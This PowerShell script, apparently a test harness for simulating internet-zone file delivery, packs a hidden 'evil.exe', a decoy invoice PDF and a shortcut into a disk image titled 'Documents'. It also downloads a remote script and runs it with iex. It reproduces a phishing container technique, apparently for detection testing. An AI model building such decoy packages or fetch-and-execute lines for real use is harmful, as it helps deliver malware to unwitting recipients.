# source: https://gist.githubusercontent.com/mgraeber-rc/a780834c983bc0d53121c39c276bd9f3/raw/94e9e4b685f03bb0dadc5a6516948c1c55c5e080/SimulateInternetZoneTest.ps1
$eviliso = "Documents.img"
$destdir = "Documents"
$evilexe = "evil.exe"
$parceltitle = "Documents"
$exepath = $destdir + "\" + $evilexe
$decoyfile = "Invoice.pdf"
$lnkfile = "safe.lnk"

# Copy assets into the $destdir directory. An ISO will be created from this directory.
mkdir $destdir
cp $evilexe $destdir
cp $decoyfile $destdir
cp $lnkfile $destdir
(get-item $exepath).Attributes += 'Hidden'

# Create an ISO file from the $destdir directory.
# New-IsoFile from: https://github.com/wikijm/PowerShell-AdminScripts/blob/master/Miscellaneous/New-IsoFile.ps1
(New-Object net.webclient).DownloadString('https://raw.githubusercontent.com/wikijm/PowerShell-AdminScripts/master/Miscellaneous/New-IsoFile.ps1')|iex
ls -Force $destdir | New-IsoFile -Path $eviliso -Media CDR -Title $parceltitle
